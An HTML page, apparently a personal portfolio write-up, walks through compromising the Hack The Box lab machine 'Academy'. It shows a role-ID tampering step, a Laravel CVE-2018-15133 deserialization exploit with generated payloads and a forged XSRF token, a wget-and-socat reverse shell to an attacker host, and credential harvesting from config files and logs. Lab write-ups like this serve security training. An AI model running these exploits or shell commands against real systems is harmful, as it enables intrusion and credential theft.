@@ -1,0 +1,518 @@
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Portfolio</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css"/>
+    <link rel="stylesheet" href="/assets/css/atom-one-light.css">
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+
+	<div class="sidebar">
+		<ul class="sidebar-list">
+		  <li class="sidebar-item"><a href="/" class="sidebar-anchor">Home</a></li>
+		  <li class="sidebar-item"><a href="/HackTheBoxNAVPAGE.html" class="sidebar-anchor">Hack The Box</a></li>
+		  <li class="sidebar-item"><a href="/Vulnhub.html" class="sidebar-anchor">Vuln Hub</a></li>
+		  <li class="sidebar-item"><a href="#" class="sidebar-anchor">Write-ups</a></li>
+		</ul>
+	  </div>
+
+<main>
+	<body class="is-preload">
+		<!-- Header -->
+			<section id="header">
+				<header>
+					<h1>Academy</h1>
+					<p>A Hack The Box Machine</p>
+
+			<!--SIDE NAV BAR-->
+			<div class="nav-right visible-xs">
+				<div class="button2" id="btn">
+				  <div class="bar top"></div>
+				  <div class="bar middle"></div>
+				  <div class="bar bottom"></div>
+				</div>
+			  </div>
+			  
+			 
+			  <!-- nav-right -->
+			  
+				<nav>
+				  <div class="nav-right hidden-xs">
+					<div class="button2" id="btn">
+					  <div class="bar top"></div>
+					  <div class="bar middle"></div>
+					  <div class="bar bottom"></div>
+					</div>
+				  </div>
+				  <!-- nav-right -->
+				</nav>
+			  
+				</header>
+        </section>
+	
+
+
+			<!--Search Box-->
+      <form1 id="test">
+				<input type="text" name="input" class="input1" id="search-input">
+				<button1 type="reset" class="search1" id="search-btn"></button1>
+			</form1>
+
+
+
+      <article class="container box style3 ">
+            
+        <div id="content">
+          <h1 id="lord-of-the-root">Reconnaissance</h1>
+          <h2 id="nmap">NMAP</h2>
+
+            <pre><code class="bash lang-bash language-bash"># Nmap 7.80 scan initiated Mon Dec 21 08:50:42 2020 as: nmap -Pn -sV -p- -A -oN nmap.txt 10.10.10.215
+            Nmap scan report for 10.10.10.215
+            Host is up (0.19s latency).
+            Not shown: 65532 closed ports
+            PORT      STATE SERVICE VERSION
+            22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+            80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+            |_http-server-header: Apache/2.4.41 (Ubuntu)
+            |_http-title: Did not follow redirect to http://academy.htb/
+            33060/tcp open  mysqlx?
+            | fingerprint-strings: 
+            |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+            |     Invalid message"
+            |_    HY000
+            1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+            SF-Port33060-TCP:V=7.80%I=7%D=12/21%Time=5FE06600%P=x86_64-pc-linux-gnu%r(
+            SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
+            SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO
+            SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0
+            SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer
+            SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,
+            SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
+            SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
+            SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
+            SF:1\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCooki
+            SF:e,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\
+            SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
+            SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,
+            SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05
+            SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
+            SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString
+            SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x
+            SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
+            SF:\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOption
+            SF:s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\
+            SF:x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,
+            SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x
+            SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
+            SF:0")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\
+            SF:0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
+            SF:r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x
+            SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
+            SF:\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
+            No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+            TCP/IP fingerprint:
+            OS:SCAN(V=7.80%E=4%D=12/21%OT=22%CT=1%CU=39318%PV=Y%DS=2%DC=T%G=Y%TM=5FE066
+            OS:2A%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS
+            OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+            OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+            OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+            OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+            OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+            OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+            OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+            OS:=S)
+            
+            Network Distance: 2 hops
+            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            
+            TRACEROUTE (using port 443/tcp)
+            HOP RTT       ADDRESS
+            1   201.04 ms 10.10.14.1
+            2   201.13 ms 10.10.10.215
+            
+            OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+            # Nmap done at Mon Dec 21 09:08:58 2020 -- 1 IP address (1 host up) scanned in 1095.93 seconds
+            
+            </code></pre>
+            
+            <h2 id="webserver">Webserver</h2>
+            
+            <p><img src="screenshot-2021-02-08-at-183639png" alt="Screenshot 2021-02-08 at 18.36.39.png" /></p>
+            
+            <pre><code class="bash lang-bash language-bash">POST /register.php HTTP/1.1
+            Host: academy.htb
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 44
+            Origin: http://academy.htb
+            Connection: close
+            Referer: http://academy.htb/register.php
+            Cookie: PHPSESSID=2bbk8prk3s2bkdi0dtm5bett4s
+            Upgrade-Insecure-Requests: 1
+            
+            uid=user1&password=pass&confirm=pass&roleid=0</code></pre><br />
+            
+            <h2 id="register-an-account">Register an account</h2>
+        
+        <div class="text">
+            <p>We Need to bypass authentication to get an admin account. I intercepted the request on the register an account
+            page to see what perameters were beeing sent over. "roleid" looks good! If we change roleid = 1. 
+            What happens? If nothing, try 2, 3 ... etc. We could even throw it into burp intruder to bruteforce.
+            Role id definitely seems like something related to permissions, so if we change role id do our permissions change?
+            </p><br />
+            <p>Yes they do. We become an Admin</p>
+        </div>
+            
+            <p><img src="screenshot-2021-02-08-at-183728png" alt="Screenshot 2021-02-08 at 18.37.28.png" /></p>
+            
+            <h2 id="admin-panel">Admin panel</h2>
+            
+            <div class="text">
+            <p>Laravel? What is this?
+            So We dont actually need to be an Admin to access this page... Or even have an account as 
+            there is no session ID. We only needed Admin to find the dev domain, probably could have fuzzed this.
+            </p>
+            <p>
+            So there is nothing here that screams vulnerable immediately, however there is some sensitive information
+            hidden within the dev panel. A quick google search revealed an exploit in the Laravel web framework if 
+            you have the APP KEY, which we do in this case.</p>
+            
+            <p>In real life the dev domain would be access controlled to prevent an attacker getting the APP_KEY</p>
+            </div>
+            <p><img src="screenshot-2021-02-08-at-183806png" alt="Screenshot 2021-02-08 at 18.38.06.png" /></p>
+            
+            <blockquote>Laravel is a free, open-source PHP web framework</blockquote><br />
+            
+            
+            <h3 id="rce">RCE</h3>
+            <div class="text">
+            <p>In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur 
+            as a result of an unserialize call on a potentially <strong>untrusted X-XSRF-TOKEN</strong> value. 
+            This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in 
+            gadget chains/Laravel/RCE/3/chain.php in <strong>phpggc</strong>. </p>
+            
+            <p>The attacker must know the <strong>application key</strong>, which normally would never occur, but 
+              could happen if the attacker previously had privileged access or successfully accomplished a previous 
+              attack.</p>
+            
+            <h3 id="poc">POC</h3>
+            
+            <p>https://github.com/kozmic/laravel-poc-CVE-2018-15133<br />
+            </p>
+            
+            <p>We need to use phpgcc which is a php library of unserialize payloads and a tool to generate them.</p>
+            <p>We can run phpgcc and use grep to search for leravel which reveals a gadget to execute id</p>
+
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">┌──(root💀kali)-[~/Documents/hackthebox/academy/phpggc]
+            └─# ./phpggc | grep Laravel
+              ./phpggc Laravel/RCE1 system id</code></pre>
+            
+              <div class="text">
+            
+            <p>From here we need to use a poc by kozmic to encrypt the gadget with the APP Key we found on the 
+              dev webserver (http://dev-staging-01.academy.htb) This gives us an XSRF token we can use to POST 
+              to the webserver to see if we can get code execution </p>
+            
+            
+              </div>
+
+            <h3 id="code-execution">Code Execution</h3><br />
+            
+            <pre><code class="bash lang-bash language-bash">┌──(root💀kali)-[~/Documents/hackthebox/academy/phpggc]
+            └─# ./phpggc Laravel/RCE1 system id -b 
+            Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI6ImlkIjt9
+            
+            ┌──(root💀kali)-[~/Documents/hackthebox/academy/phpggc]
+            └─# cd ..                              
+            
+            ┌──(root💀kali)-[~/Documents/hackthebox/academy]
+            └─# ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI6ImlkIjt9
+            PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic
+            
+            HTTP header for POST request: 
+            X-XSRF-TOKEN: eyJpdiI6Ijh5eHdncWlRSDZob3lNSFJXV1ZsK0E9PSIsInZhbHVlIjoiblNGR1lqelNSR2Z6K3RsQ3pQdHFKcm5kSWpJdmh5VTN4ZUVla0Z2Ykd6aVJ5SzdYS290M2NXd2o1bkw3a2lJNkp0bW5vaUNWM0V5Ylh2N05IeVNJYmVhK2RBOVZTY1J1VDduTSsybUw0cVAwMldSOWtHaGVFcHVIQWhuZFNZQ1o5eVpmbEFGRlo4WkprVXhxWkhMallmdmZLUVRFS0ZOcG9EczlqSjY3QmFmcFU0NVpPZWVNTkloTUg2VGxUYmEwSW14bTczYXpDOE8rb2pPa0FGVFhQT0tndXo1bFZYUXlNeENXZ1R3bVdNcz0iLCJtYWMiOiIwZDdkZWU2NDVmZWNmM2Q1NjVkNzY1NWExZGU0ODI0N2E1YjUxMzQ3MmUxNzc3MWFkODdmMGY1YzFiZjdhYWY4In0=
+            </code></pre><br />
+            
+            <pre><code class="bash lang-bash language-bash">┌──(root💀kali)-[~/Documents/hackthebox/academy/phpggc]
+            └─# curl http://dev-staging-01.academy.htb/ -X POST -H 'X-XSRF-TOKEN: eyJpdiI6ImphYUwrazhLR3lpak5zZDJKbk8zUmc9PSIsInZhbHVlIjoidEhOb3N1TFhcL3RYWDcxNEZvemlQdmF4Tlp4QVA4U01UVWlJNXJuQUhUOUVMTnA4RHVCM2d5ZURHWk5GbXZuSlN3ZjVZQVE3Yjg4dWliVkhRQWhqZ0RGd090bVpCTEUxVVltdkVIZmxpbGpLbWdlQTc2akRzcjFTQXdiWnAreWFsMVwvMDlwcGViRmJwekYyZHRLXC9PMXNINVFhTFZHbGJRZWc1eUY1ajJqZURnNHh3cFArV2FaMElVN1pid2NrQnNkTlVCTjFzQlRUSDdZcG4yaGtXZ1NCT3E3YW16YzBiUlNNeHFuU040ZCs2bz0iLCJtYWMiOiJkOTQ1MDQ1NDI4OTEzZTFkNTAxODkwNDM4M2Q1NzU5YzRmMDBkYzhmNmUzMDQ0MmFhMjgxYmExZjAzNzZjZjMwIn0=' | head -n 2
+            
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            </code></pre>
+            
+            <div class="text">
+            <p>Code execution works.</p>
+            </div>
+            
+            <h3 id="another-poc">Another POC</h3>
+            
+            <div class="text">
+
+            <a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133"> https://github.com/aljavier/exploit_laravel_cve-2018-15133 </a>
+            
+            <p> I also found this python script that automates this for us and gives us a way to send any command without repeating the steps
+              of serializing our payload each time. </p>
+            
+            <p> It is not a shell but just an interative way to send commands </p>
+            </div>
+            
+            <pre><code class="bash lang-bash language-bash">┌──(root💀kali)-[~/Documents/hackthebox/academy/exploit_laravel_cve-2018-15133]
+            └─# python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
+            
+            Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+            
+             Running in interactive mode. Press CTRL+C to exit.
+            $ uname -a
+            Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+            
+            $ id
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            
+            $ pwd
+            /var/www/html/htb-academy-dev-01/public
+            
+            $ ls
+            css
+            favicon.ico
+            index.php
+            js
+            robots.txt
+            web.config
+            </code></pre><br />
+            
+            <h3 id="reverse-shell">Reverse shell</h3>
+            
+            <div class="text">
+
+            <p>
+            netcat seems to not execute reverse shell through RCE. This is pretty common of newwer machines to prevent against this type of
+            thing, however, it's pretty easy to bypass by using socat. I am just going to install socat to the /tmp directory as i don't 
+          have write privileges in the current directory. From there i will execute a simple reverse shell </p>
+
+          <p> I like using socat as it sends a nice interactive terminal and there aren't too many environment variables that need to be set
+            every time i gain a new shell which makes persistance a hell of a lot easier. </p>
+            
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">wget http://attacker.com/socat.exe -P /tmp</code></pre>
+            
+            <div class="text">
+            <p>Reverse shell working</p>
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">Using RCE to victim
+            $ wget http://10.10.14.209/socat.exe -P /tmp; chmod +x /tmp/socat.exe; /tmp/socat.exe exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.209:4444; rm /tmp/socat.exe</code></pre>
+            
+              <br />
+
+            <pre><code class="bash lang-bash language-bash">Listen on Host machine
+            ┌──(root💀kali)-[~]
+            └─# socat file:`tty`,raw,echo=0 tcp-listen:4444  
+            www-data@academy:/var/www/html/htb-academy-dev-01/public$ </code></pre><br />
+            
+            <h2 id="lateral-movement">Lateral movement</h2>
+            
+            <div class="text">
+            
+            <p> Nothing crazy stands out from doing the standard commands for low hanging fruit like sudo -l. So Using some standard 
+              grep and find commands to search for anything of interest. </p>
+            
+            <p>We know we need to get user cry0l1t3 as they have the user flag, so searching for any files or executeables in their 
+              name or group would be the right place to look. Or if in doubt check log files</p>
+            
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">
+            [+] Environment
+            [i] Any private information inside environment variables?
+            
+            DB_CONNECTION=mysql
+            DB_PORT=3306
+            DB_DATABASE=homestead
+            DB_USERNAME=homestead
+            DB_USERNAME=dev
+            DB_PASSWORD=secret
+            DB_HOST=127.0.0.1
+            
+            </code></pre><br />
+            
+            <pre><code class="bash lang-bash language-bash">/var/log/syslog
+            /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal
+            /var/log/auth.log
+            /var/log/bootstrap.log
+            
+            /var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'SecREt01';
+            /var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $password = 'test1234';
+            
+            $2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm - bcrypt?</code></pre><br />
+            
+            <pre><code class="bash lang-bash language-bash">www-data@academy:/var/www/html/academy$ diff  ./config/ ../htb-academy-dev-01/config/
+            diff ./.env ../htb-academy-dev-01/.env
+            4c4
+            < APP_DEBUG=false
+            ---
+            > APP_DEBUG=true
+            12,14c12,14
+            < DB_DATABASE=academy
+            < DB_USERNAME=dev
+            < DB_PASSWORD=mySup3rP4s5w0rd!!
+            ---
+            </code></pre>
+            
+            <div class="text">
+            <p>So i found a few log files and database files with potential creds and hashes in, i initially tried logging into the mysql
+              database locally</p>
+
+              </div>
+            
+            <pre><code class="bash lang-bash language-bash">www-data@academy:/var/www/html/academy$ mysql -u dev -p
+            Enter password: 
+            ERROR 1045 (28000): Access denied for user 'dev'@'localhost' (using password: YES)
+            </code></pre>
+            
+            <div class="text">
+            <p>Oh. That didn't work.</p>
+            
+            <p>Password reuse is a serious real world issue so maybe try switching to cyr0l1t3? we know thats the user we need to get so 
+              worth a shot.</p>
+            
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">www-data@academy:/var/www/html/academy$ su cry0l1t3
+            Password: 
+            $ id
+            uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
+            $ </code></pre>
+            
+              <div class="text">
+            <p>well... That worked.</p>
+              </div>
+            
+            <h3 id="user-2">User 2</h3>
+            
+            <div class="text">
+            <p>Now time to get the second user</p>
+
+            <p> We can see we are in the adm group so we can read log files that are only readable to root. This is a great place to look if 
+              a user is ever in this group.
+            </p>
+            </div>
+
+            <pre><code class="bash lang-bash language-bash">[+] Readable files belonging to root and readable by me but not world readable
+            -rw-r----- 1 root adm 4726 Nov  5 12:55 /var/log/apt/term.log.2.gz
+            -rw-r----- 1 root adm 2748 Sep 14 20:58 /var/log/apt/term.log.3.gz
+            -rw-r----- 1 root adm 463 Feb  9 14:25 /var/log/apt/term.log.1.gz
+            -rw-r----- 1 root adm 10682 Aug 12  2020 /var/log/apt/term.log.4.gz
+            -rw-r----- 1 root adm 0 Feb 23 15:34 /var/log/apt/term.log
+            -r--r----- 1 root adm 8388720 Sep  4 03:45 /var/log/audit/audit.log.2
+            -rw-r----- 1 root adm 445650 Feb 23 16:59 /var/log/audit/audit.log
+            -r--r----- 1 root adm 8388617 Aug 23  2020 /var/log/audit/audit.log.3
+            -r--r----- 1 root adm 8388813 Nov  9 10:11 /var/log/audit/audit.log.1
+            -rw-r----- 1 root adm 275 Oct 21 10:57 /var/log/apache2/error.log.5.gz
+            -rw-r----- 1 root adm 335 Sep 12 00:00 /var/log/apache2/error.log.9.gz
+            -rw-r----- 1 root adm 230 Nov  9 10:14 /var/log/apache2/error.log.2.gz
+            -rw-r----- 1 root adm 6748 Aug  9  2020 /var/log/apache2/access.log.7.gz
+            -rw-r----- 1 root adm 2472 Aug 11  2020 /var/log/apache2/access.log.5.gz
+            -rw-r----- 1 root adm 6635359 Feb 23 16:46 /var/log/apache2/access.log
+            -rw-r----- 1 root adm 0 Aug  7  2020 /var/log/apache2/other_vhosts_access.log
+            -rw-r----- 1 root adm 304254 Nov  5 12:56 /var/log/apache2/access.log.1
+            -rw-r----- 1 root adm 251297 Feb 23 16:46 /var/log/apache2/error.log
+            -rw-r----- 1 root adm 2902 Aug 10  2020 /var/log/apache2/access.log.6.gz
+            -rw-r----- 1 root adm 338 Sep  9 00:00 /var/log/apache2/error.log.12.gz
+            -rw-r----- 1 root adm 337 Sep  8 00:00 /var/log/apache2/error.log.13.gz
+            -rw-r----- 1 root adm 366 Nov  5 14:19 /var/log/apache2/error.log.4.gz
+            -rw-r----- 1 root adm 8042 Aug 12  2020 /var/log/apache2/access.log.4.gz
+            -rw-r----- 1 root adm 2318 Feb 23 15:34 /var/log/apache2/error.log.1
+            -rw-r----- 1 root adm 412 Nov  9 10:11 /var/log/apache2/error.log.3.gz
+            -rw-r----- 1 root adm 2087 Aug 13  2020 /var/log/apache2/access.log.3.gz
+            -rw-r----- 1 root adm 336 Sep 11 00:00 /var/log/apache2/error.log.10.gz
+            -rw-r----- 1 root adm 759 Oct 21 09:46 /var/log/apache2/error.log.6.gz
+            -rw-r----- 1 root adm 7665 Sep 14 22:59 /var/log/apache2/access.log.2.gz
+            -rw-r----- 1 root adm 335 Sep 13 00:00 /var/log/apache2/error.log.8.gz
+            -rw-r----- 1 root adm 336 Sep 10 00:00 /var/log/apache2/error.log.11.gz
+            -rw-r----- 1 root adm 644 Aug  8  2020 /var/log/apache2/access.log.8.gz
+            -rw-r----- 1 root adm 337 Sep 14 00:00 /var/log/apache2/error.log.7.gz
+            -rw-r----- 1 root adm 336 Sep  7 00:00 /var/log/apache2/error.log.14.gz
+            </code></pre><br />
+            
+            <pre><code class="bash lang-bash language-bash">cry0l1t3@academy:/home$ grep -r egre55 / 2>/dev/null | grep  -v /proc 
+            /etc/passwd-:egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
+            /etc/passwd:egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
+            /etc/subuid:egre55:100000:65536
+            /etc/subuid-:egre55:100000:65536
+            /etc/subgid-:egre55:100000:65536
+            /etc/group-:adm:x:4:syslog,egre55,cry0l1t3
+            /etc/group-:cdrom:x:24:egre55
+            /etc/group-:sudo:x:27:egre55
+            /etc/group-:dip:x:30:egre55
+            /etc/group-:plugdev:x:46:egre55
+            /etc/group-:lxd:x:116:egre55
+            /etc/group-:egre55:x:1000:
+            /etc/group:adm:x:4:syslog,egre55,cry0l1t3
+            /etc/group:cdrom:x:24:egre55
+            /etc/group:sudo:x:27:egre55
+            /etc/group:dip:x:30:egre55
+            /etc/group:plugdev:x:46:egre55
+            /etc/group:lxd:x:116:egre55
+            /etc/group:egre55:x:1000:
+            /etc/subgid:egre55:100000:65536</code></pre><br />
+
+            <div class="text">
+              <p> So it takes some serious grepping to filter the huge amount of logs but there is a password for egre55 in those log files
+              </p>
+              </div>
+            
+            <h2 id="privilege-escalation">Privilege escalation</h2>
+            
+            <div class="text">
+              <p> There is a vulnerable binary egre55 can run with sudo/ root privileges which can be exploited to get privilege escalation.
+              </p>
+              </div>
+
+            </div>
+            
+        
+      </article>
+
+		<section id="footer">
+			<ul class="icons">
+				<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+				<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
+				<li><a href="#" class="icon brands fa-google-plus-g"><span class="label">Google+</span></a></li>
+				<li><a href="#" class="icon brands fa-pinterest"><span class="label">Pinterest</span></a></li>
+				<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
+				<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
+			</ul>
+			<div class="copyright">
+				<ul class="menu">
+					<li>&copy; </a></li>
+				</ul>
+			</div>
+		</section>
+    <br />
+
+		<!-- Scripts -->
+			<script src="/assets/js/jquery.min.js"></script>
+			<script src="/assets/js/jquery.scrolly.min.js"></script>
+			<script src="/assets/js/jquery.poptrox.min.js"></script>
+			<script src="/assets/js/browser.min.js"></script>
+			<script src="/assets/js/breakpoints.min.js"></script>
+			<script src="/assets/js/util.js"></script>
+			<script src="/assets/js/main.js"></script>
+      <script src="/assets/js/button.js"></script>
+			<script src="/assets/js/NavBar.js"></script>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+      <script src="/assets/js/highlight.pack.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script>
+
+
+	</body>
+</main>
+</html>
